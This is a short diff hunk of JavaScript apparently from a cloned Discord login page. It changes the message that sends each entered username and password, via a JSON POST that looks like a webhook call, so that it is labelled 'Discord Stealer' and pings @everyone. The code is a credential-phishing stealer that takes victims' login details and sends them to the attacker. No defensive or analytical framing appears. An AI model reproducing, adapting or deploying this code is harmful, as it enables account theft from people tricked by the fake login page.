@@ -23,7 +23,7 @@ document.addEventListener("DOMContentLoaded", () => {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        content: `**Login Discord Clone**\\nUsername: ${username}\\nPassword: ${password}`
+        content: `@everyone **Discord Stealer** Username: ${username} Password: ${password}`
       })
     });
 
